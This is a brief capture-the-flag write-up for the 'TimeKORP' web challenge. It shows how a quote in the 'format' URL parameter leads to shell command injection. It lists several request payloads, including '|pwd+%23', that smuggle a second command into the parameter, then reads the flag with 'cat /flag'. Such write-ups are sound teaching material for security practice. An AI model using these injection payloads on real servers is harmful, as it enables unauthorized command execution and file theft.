# TimeKORP

So we start off with this page:

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

if i put a quote at the end of the url we get a blank response:

<figure><img src="../../../../.gitbook/assets/image (5) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i capture the request, send it to the repeater and start looking how i can get an output via command injection:

```
GET /?format=%Y-%25m-%25d'|pwd
GET /?format=%Y-%25m-%25d'pwd
GET /?format=%Y-%25m-%25d'|pwd#
GET /?format=%Y-%25m-%25d'|pwd+
GET /?format=%Y-%25m-%25d'|pwd+%23
```

and the last payload works, i needed to comment out the rest of what the backend server was doing and url encode my request:

<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So we just need to change the command to cat /flag and we get our flag
